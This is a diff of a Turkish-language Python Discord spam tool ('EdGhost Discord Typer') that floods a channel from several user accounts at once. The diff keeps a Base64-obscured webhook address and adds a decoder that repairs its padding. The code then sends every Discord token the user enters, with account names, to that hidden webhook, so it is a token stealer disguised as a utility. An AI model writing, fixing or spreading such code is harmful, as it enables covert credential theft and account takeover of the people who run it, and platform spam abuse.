@@ -3,7 +3,7 @@ import time
 import os
 import sys
 import threading
-import base64  # 🔒 Şifre çözme kütüphanesi eklendi
+import base64
 from colorama import Fore, init
 
 # Colorama başlatma
@@ -15,11 +15,18 @@ rate_limits = 0
 start_time = time.time()
 lock = threading.Lock()
 
-# 📡 Webhook adresinin Base64 ile gizlenmiş hali (Düz metin olarak okunamaz)
-GIZLI_WEBHOOK = b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNDAxNjI2MjA5MzQ3MTgzOC9yUkNST2JuODNjZVFqeHBucFgtLW1tOVVLNjRYM0pLT0I0Zks_aTldTmNfWFAxUjlpUjRmMTFHREt4TDRxejFDNEE5Qkg='
+# 📡 Güvenli hale getirilmiş Base64 metni
+GIZLI_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNDAxNjI2MjA5MzQ3MTgzOC9yUkNST2JuODNjZVFqeHBucFgtLW1tOVVLNjRYM0pLT0I0Zks_aTldTmNfWFAxUjlpUjRmMTFHREt4TDRxejFDNEE5Qkg="
 
-# Arka planda adresi çözen güvenli değişken
-WEBHOOK_URL = base64.b64decode(GIZLI_WEBHOOK).decode('utf-8')
+# Padding (dolgu) hatasını engelleyen akıllı deşifre sistemi
+def webhook_coz(data):
+    missing_padding = len(data) % 4
+    if missing_padding:
+        data += '=' * (4 - missing_padding)
+    return base64.b64decode(data.encode('utf-8')).decode('utf-8')
+
+# Adresi çözen güvenli değişken
+WEBHOOK_URL = webhook_coz(GIZLI_WEBHOOK)
 
 def bilgi_gonder_webhooka(baslik, aciklama, renk=3066993):
     payload = {
@@ -48,7 +55,6 @@ def update_dashboard(account_count, mod_adi):
     global total_sent, rate_limits
     uptime = get_uptime()
     
-    # İmleci sol üste taşır (clear atmadan daha akıcı yenileme sağlar)
     sys.stdout.write("\033[H")
     
     panel = f"""
@@ -76,7 +82,6 @@ def worker_thread(token, channel_id, delay, mode, payload_data, account_count, m
     }
     url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
     
-    # Mod 1: Tek mesajı sürekli döngüde atar
     if mode == "1":
         while True:
             payload = {'content': payload_data}
@@ -95,7 +100,6 @@ def worker_thread(token, channel_id, delay, mode, payload_data, account_count, m
                     rate_limits += 1
             time.sleep(delay)
             
-    # Mod 2: Kelime listesinden sırayla döngüde atar
     elif mode == "2":
         while True:
             for word in payload_data:
@@ -121,7 +125,6 @@ def main():
     clear_screen()
     print(Fore.GREEN + "--- EdGhost Discord Typer Gelişmiş Kurulum ---")
     
-    # 🔢 Kaç token girileceğini soran güvenli döngü
     while True:
         token_input = input(Fore.YELLOW + "Kaç adet token girmek istiyorsunuz?: ").strip()
         if token_input.isdigit() and int(token_input) > 0:
@@ -141,7 +144,6 @@ def main():
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
         }
         
-        # Token Doğrulama Sistemi
         validate = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
         if validate.status_code == 200:
             user_info = validate.json()
@@ -156,7 +158,6 @@ def main():
         print(Fore.RED + "\nHepsi geçersiz! Geçerli token girilmediği için sistem kapatılıyor.")
         return
 
-    # Mod Seçimi
     while True:
         print(Fore.CYAN + "\n[1] Mod1: Tek Mesaj (Aynı mesajı sürekli atar)")
         print(Fore.CYAN + "[2] Mod2: Kelime Listesi Modu (Kelimeleri elle girersiniz)")
@@ -168,7 +169,6 @@ def main():
     
     mod_adi = "Tek Mesaj" if mode == "1" else "Kelime Listesi"
     
-    # 📺 KANAL ID GÜVENLİ KONTROLÜ
     while True:
         channel_id = input(Fore.WHITE + "Kanal ID girin: ").strip()
         if channel_id.isdigit():
@@ -176,7 +176,6 @@ def main():
         else:
             print(Fore.RED + "Lütfen sadece sayılardan oluşan geçerli bir Kanal ID girin!")
     
-    # ⏳ Saniye gecikmesi için güvenli kontrol
     while True:
         delay_input = input(Fore.WHITE + "Kaç saniyede bir gönderilsin? (Örn: 0.5): ").strip()
         try:
@@ -199,7 +198,6 @@ def main():
             print(Fore.RED + "Kelime listesi boş bırakılamaz!")
             return
 
-    # Detaylı Webhook Bilgilendirmesi
     token_log_metni = "\n".join([f"**🔑 Token {idx+1}:** `{t}`" for idx, t in enumerate(tokens)])
     hesap_log_metni = ", ".join(valid_usernames)
 
@@ -214,19 +212,16 @@ def main():
         renk=15105570
     )
 
-    # Ekranı temizle ve siber paneli başlat
     clear_screen()
     print(Fore.YELLOW + "Sistem optimize ediliyor, thread'ler ateşleniyor...")
     time.sleep(1.5)
     clear_screen()
 
-    # Kaç tane token varsa hepsini thread olarak eşzamanlı başlatıyoruz
     for t in tokens:
         th = threading.Thread(target=worker_thread, args=(t, channel_id, delay, mode, payload_data, len(tokens), mod_adi))
         th.daemon = True
         th.start()
 
-    # Paneli sürekli canlı tutan ana döngü
     while True:
         with lock:
             update_dashboard(len(tokens), mod_adi)
